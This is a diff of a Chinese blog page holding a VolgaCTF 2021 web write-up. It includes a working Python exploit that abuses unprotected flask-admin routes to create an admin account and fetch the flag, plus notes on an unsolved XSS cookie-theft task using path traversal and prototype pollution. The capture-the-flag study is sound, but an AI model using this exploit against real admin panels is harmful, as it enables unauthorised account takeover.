@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k 字
+      2.3k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      19
+      36
        分钟
     </span>
   
@@ -229,7 +229,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：1 分钟前
+                  本文最后更新于：几秒前
                 
               </p>
             
@@ -406,7 +406,116 @@ header(<span class="hljs-string">&quot;Location: http://127.0.0.1/api/admin/os_i
 
 <h2 id="0x04-flask-admin"><a href="#0x04-flask-admin" class="headerlink" title="0x04 flask-admin"></a>0x04 flask-admin</h2><p><a target="_blank" rel="noopener" href="http://172.105.84.156:5000/">http://172.105.84.156:5000/</a></p>
 <p><a target="_blank" rel="noopener" href="https://q.2021.volgactf.ru/files/4d8310081ee27faaf342cfcf19b0c4d3/routes.py">routes.py</a></p>
-<p>神似hctf_flask：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/50431721">https://zhuanlan.zhihu.com/p/50431721</a> 但是不知道怎么读session key</p>
+<p>这道题给routes.py</p>
+<p>拿到flag的条件是以admin身份登录，最开始我们想的是通过session伪造的方式，但是拿不到key，题目给的是flask-admin，想必是flask-admin的问题。</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210330213957979.png" alt="image-20210330213957979"></p>
+<p>其中对于flask-admin页面的路由写的很奇怪</p>
+<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyAdmin</span>(<span class="hljs-params">admin.AdminIndexView</span>):</span>
+<span class="hljs-meta">    @expose(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span>
+<span class="hljs-meta">    @admin_required</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>(MyAdmin, self).index()
+
+<span class="hljs-meta">    @expose(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span></span>)</span>
+<span class="hljs-meta">    @expose(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&#x27;</span></span>)</span>
+<span class="hljs-meta">    @admin_required</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;TODO, need create custom view&#x27;</span>)
+
+
+admin = Admin(app,
+              name=<span class="hljs-string">&#x27;VolgaCTF&#x27;</span>,
+              template_mode=<span class="hljs-string">&#x27;bootstrap3&#x27;</span>,
+              index_view=MyAdmin())
+admin.add_view(ModelView(User, db.session))</code></pre></div>
+
+<p>问题应该就出在这。</p>
+<blockquote>
+<p>Flask-Admin是一个功能齐全、简单易用的Flask扩展，让你可以为Flask应用程序增加管理界面。</p>
+</blockquote>
+<p>查询flask-admin文档可以发现其<a target="_blank" rel="noopener" href="https://flask-admin.readthedocs.io/en/latest/api/mod_base/#default-view">默认的管理员页面</a>，flask-admin涉及几个问题</p>
+<ul>
+<li><code>/admin</code>路由不受用户身份验证的保护</li>
+<li>可以通过自己编写的视图传递给Admin构造函数来修改默认的路由，例如</li>
+</ul>
+<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyHomeView</span>(<span class="hljs-params">AdminIndexView</span>):</span>
+<span class="hljs-meta">    @expose(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>(<span class="hljs-params">self</span>):</span>
+        arg1 = <span class="hljs-string">&#x27;Hello&#x27;</span>
+        <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;admin/myhome.html&#x27;</span>, arg1=arg1)
+
+admin = Admin(index_view=MyHomeView())</code></pre></div>
+
+
+
+<p>本题就是将默认管理员页面换成了/admin/user/</p>
+<p>flask-admin内置的功能页面：</p>
+<ul>
+<li>/new 用户创建页面，可以创建管理员</li>
+<li>/edit?id=xxx 修改页面，</li>
+</ul>
+<p>访问/admin/user/edit?id=1，得到如下页面</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/112758387-bf6ee080-9020-11eb-81b3-92b1597b18f5.png"></p>
+<p>flask中用户的密码使用werkzeug的generate_password_hash,check_password_hash来得到hash和验证hash</p>
+<h3 id="解1：直接搜索得到密码"><a href="#解1：直接搜索得到密码" class="headerlink" title="解1：直接搜索得到密码"></a>解1：直接搜索得到密码</h3><p>直接搜索那个hash可以找到这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jackadam/p/12196826.html">Flask开发中的用户密码加密</a></p>
+<p>可以知道密码是hello，登录即可得到flag</p>
+<h3 id="解2：伪造管理员用户"><a href="#解2：伪造管理员用户" class="headerlink" title="解2：伪造管理员用户"></a>解2：伪造管理员用户</h3><p>本地生成Hash即可伪造：</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210330214658991.png" alt="image-20210330214658991"></p>
+<p>exp：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">from</span> werkzeug.security <span class="hljs-keyword">import</span> generate_password_hash
+<span class="hljs-keyword">import</span> re
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_csrf</span>(<span class="hljs-params">s,url</span>):</span>
+   resp = s.get(url).text
+   regex = <span class="hljs-string">r&#x27;&lt;input\sid=&quot;csrf_token&quot;\sname=&quot;csrf_token&quot;\stype=&quot;hidden&quot;\svalue=&quot;(.*?)&quot;&gt;&#x27;</span>
+   <span class="hljs-keyword">return</span> re.findall(regex, resp)[-<span class="hljs-number">1</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params">s</span>):</span>
+   flag_url = host + <span class="hljs-string">&#x27;/&#x27;</span>
+   answ = s.get(flag_url).text
+   flag = re.findall(<span class="hljs-string">&#x27;VolgaCTF&#123;.+?&#125;&#x27;</span>, answ)[-<span class="hljs-number">1</span>]
+   <span class="hljs-keyword">return</span> flag
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">authN</span>(<span class="hljs-params">s, auth_url, user, password</span>):</span>
+   data = &#123;<span class="hljs-string">&#x27;csrf_token&#x27;</span>: get_csrf(s, auth_url),
+           <span class="hljs-string">&#x27;username&#x27;</span>: user,
+           <span class="hljs-string">&#x27;password&#x27;</span>: password,
+           <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&quot;Sign In&quot;</span>
+           &#125;
+   resp = s.post(auth_url, data=data)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_mulicious_user</span>(<span class="hljs-params">s, email, username, password</span>):</span>
+   url = host+<span class="hljs-string">&#x27;/admin/user/new/&#x27;</span>
+   s.get(url)
+   files = &#123;<span class="hljs-string">&#x27;email&#x27;</span>: (<span class="hljs-literal">None</span>, email), <span class="hljs-string">&#x27;username&#x27;</span>: (<span class="hljs-literal">None</span>, username),
+            <span class="hljs-string">&#x27;password_hash&#x27;</span>: (<span class="hljs-literal">None</span>, generate_password_hash(password)), <span class="hljs-string">&#x27;role&#x27;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;2&#x27;</span>)&#125;
+   x = s.post(url, files=files)
+   <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+
+host = <span class="hljs-string">&#x27;http://localhost:5000&#x27;</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hack</span>():</span>
+   <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> s:
+       <span class="hljs-comment">#s.proxies.update(&#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125;)</span>
+       email = <span class="hljs-string">&#x27;hacker@volgactf.ru&#x27;</span>
+       username = <span class="hljs-string">&#x27;hacker&#x27;</span>
+       password = <span class="hljs-string">&#x27;hacker&#x27;</span>
+       create_mulicious_user(s, email, username, password)
+       authN(s,host+<span class="hljs-string">&#x27;/login&#x27;</span>, username, password)
+       print(get_flag(s))
+
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+   hack()
+</code></pre></div>
+
+
+
+
+
+
+
 <h2 id="0x05-Static-Site"><a href="#0x05-Static-Site" class="headerlink" title="0x05 Static Site"></a>0x05 Static Site</h2><p><a target="_blank" rel="noopener" href="https://static-site.volgactf-task.ru/">https://static-site.volgactf-task.ru/</a></p>
 <p><a target="_blank" rel="noopener" href="https://q.2021.volgactf.ru/files/27aa6c0c9a36d9cc5e81486bf0f7cd65/static-site.zip">static-site.zip</a></p>
 <p>xss、绕CSP</p>
@@ -415,7 +524,77 @@ header(<span class="hljs-string">&quot;Location: http://127.0.0.1/api/admin/os_i
 <p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210328160532080.png" alt="image-20210328160532080"></p>
 <h2 id="0x07-Online-Wallet-Part-2"><a href="#0x07-Online-Wallet-Part-2" class="headerlink" title="0x07 Online Wallet (Part 2)"></a>0x07 Online Wallet (Part 2)</h2><p>Steal <code>document.cookie</code></p>
 <p><a target="_blank" rel="noopener" href="https://wallet.volgactf-task.ru/">https://wallet.volgactf-task.ru/</a></p>
-<p>XSS</p>
+<p>第二题的任务是执行XSS并从bot中窃取cookie。</p>
+<p>该应用程序具有更改语言的能力，通过从Amazon S3网站下载不同版本的JS文件来实现的。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://volgactf-wallet.s3-us-west-1.amazonaws.com/locale_ru.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210329224015553.png" alt="image-20210329224015553"></p>
+<p>可以通过/wallet?lang=来修改语言，这里是突破点，</p>
+<div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://volgactf-wallet.s3-us-west-1.amazonaws.com/locale_<span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;#34;</span>.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
+
+<p>&lt;&gt;被html编码</p>
+<p>由于该值包含在脚本的路径中，因此可以使用路径穿越来访问给定网站的任意文件<code>&quot;?Lang = / .. / foo&quot;</code>。</p>
+<p>直接访问站点：<a target="_blank" rel="noopener" href="https://volgactf-wallet.s3-us-west-1.amazonaws.com/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%A0%91%E5%B9%B6%E5%AE%A1%E8%AE%A1%E5%86%85%E9%83%A8%E4%BB%A3%E7%A0%81%EF%BC%9A">https://volgactf-wallet.s3-us-west-1.amazonaws.com/，可以查看文件树并审计内部代码：</a></p>
+<p>关注：deparam.js</p>
+<div class="hljs code-wrapper"><pre><code class="hljs js">deparam = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"> params, coerce </span>) </span>&#123;
+  <span class="hljs-keyword">var</span> obj = <span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>), <span class="hljs-comment">/* Prototype Pollution fix */</span>
+    coerce_types = &#123; <span class="hljs-string">&#x27;true&#x27;</span>: !<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;false&#x27;</span>: !<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;null&#x27;</span>: <span class="hljs-literal">null</span> &#125;;
+  params.replace(<span class="hljs-regexp">/\+/g</span>, <span class="hljs-string">&#x27; &#x27;</span>).split(<span class="hljs-string">&#x27;&amp;&#x27;</span>).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">v</span>)</span>&#123;
+    <span class="hljs-keyword">var</span> param = v.split( <span class="hljs-string">&#x27;=&#x27;</span> ),
+      key = <span class="hljs-built_in">decodeURIComponent</span>( param[<span class="hljs-number">0</span>] ),
+      val,
+      cur = obj,
+      i = <span class="hljs-number">0</span>,
+      keys = key.split( <span class="hljs-string">&#x27;][&#x27;</span> ),
+      keys_last = keys.length - <span class="hljs-number">1</span>;
+    <span class="hljs-keyword">if</span> ( <span class="hljs-regexp">/\[/</span>.test( keys[<span class="hljs-number">0</span>] ) &amp;&amp; <span class="hljs-regexp">/\]$/</span>.test( keys[ keys_last ] ) ) &#123;
+      keys[ keys_last ] = keys[ keys_last ].replace( <span class="hljs-regexp">/\]$/</span>, <span class="hljs-string">&#x27;&#x27;</span> );
+      keys = keys.shift().split(<span class="hljs-string">&#x27;[&#x27;</span>).concat( keys );
+      keys_last = keys.length - <span class="hljs-number">1</span>;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+      keys_last = <span class="hljs-number">0</span>;
+    &#125;
+    <span class="hljs-keyword">if</span> ( param.length === <span class="hljs-number">2</span> ) &#123;
+      val = <span class="hljs-built_in">decodeURIComponent</span>( param[<span class="hljs-number">1</span>] );
+      <span class="hljs-keyword">if</span> ( coerce ) &#123;
+        val = val &amp;&amp; !<span class="hljs-built_in">isNaN</span>(val)            ? +val
+          : val === <span class="hljs-string">&#x27;undefined&#x27;</span>             ? <span class="hljs-literal">undefined</span>
+          : coerce_types[val] !== <span class="hljs-literal">undefined</span> ? coerce_types[val]
+          : val;
+      &#125;
+      <span class="hljs-keyword">if</span> ( keys_last ) &#123;
+        <span class="hljs-keyword">for</span> ( ; i &lt;= keys_last; i++ ) &#123;
+          key = keys[i] === <span class="hljs-string">&#x27;&#x27;</span> ? cur.length : keys[i];
+          cur = cur[key] = i &lt; keys_last
+            ? cur[key] || ( keys[i+<span class="hljs-number">1</span>] &amp;&amp; <span class="hljs-built_in">isNaN</span>( keys[i+<span class="hljs-number">1</span>] ) ? <span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>) : [] )
+            : val;
+        &#125;
+      &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">Object</span>.prototype.toString.call( obj[key] ) === <span class="hljs-string">&#x27;[object Array]&#x27;</span> ) &#123;
+          obj[key].push( val );
+        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( obj[key] !== <span class="hljs-literal">undefined</span> ) &#123;
+          obj[key] = [ obj[key], val ];
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            obj[key] = val;
+        &#125;
+      &#125;
+    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( key ) &#123;
+      obj[key] = coerce
+        ? <span class="hljs-literal">undefined</span>
+        : <span class="hljs-string">&#x27;&#x27;</span>;
+    &#125;
+  &#125;);
+  <span class="hljs-keyword">return</span> obj;
+&#125;;
+
+queryObject = deparam(location.search.slice(<span class="hljs-number">1</span>))</code></pre></div>
+
+
+
+<p>这道题比较难，需要学的东西还比较多，先放一放。</p>
+<p>众多js库的原型链污染利用项目：<a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution">client-side-prototype-pollution</a></p>
+<p>原型链污染利用链正向搜索脚本：<a target="_blank" rel="noopener" href="https://github.com/securitum/research"> research</a></p>
+<p>原型链寻找易受攻击的未初始化字段工具：<a target="_blank" rel="noopener" href="https://github.com/filedescriptor/untrusted-types">untrusted-types</a></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1>
             </div>
             <hr>
@@ -461,6 +640,12 @@ header(<span class="hljs-string">&quot;Location: http://127.0.0.1/api/admin/os_i
                 <div class="post-prevnext">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2021/03/31/teler%E5%BC%95%E5%85%A5libinjection%E5%BA%93/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">teler引入libinjection库</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
